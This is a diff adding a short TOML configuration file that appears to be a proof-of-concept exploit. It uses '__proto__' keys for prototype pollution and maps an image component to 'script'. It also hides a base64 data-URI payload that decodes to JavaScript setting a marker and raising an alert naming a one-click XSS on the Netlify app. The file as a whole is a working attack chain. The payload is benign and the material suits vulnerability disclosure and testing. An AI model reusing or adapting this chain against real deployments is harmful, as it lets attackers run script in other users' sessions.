@@ -1,0 +1,15 @@
+[a.b]
+y = 1
+
+[a.b.y.__proto__.__proto__]
+async = true
+components = []
+
+[a.b.y.__proto__.__proto__.components]
+img = "script"
+
+[__proto__]
+deployButtonMarkdownError = "![x](data:;base64,ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmRhdGFzZXQuZGVwbG95QnV0dG9uT25lQ2xpY2tYc3M9ImV4ZWN1dGVkLTIwMjYxMDE2IjthbGVydCgiTmV0bGlmeSBhcHAgb25lLWNsaWNrIFhTUzogYXBwLm5ldGxpZnkuY29tIik=)"
+
+[deployButtonMarkdownError]
+trigger = "controlled parser failure"
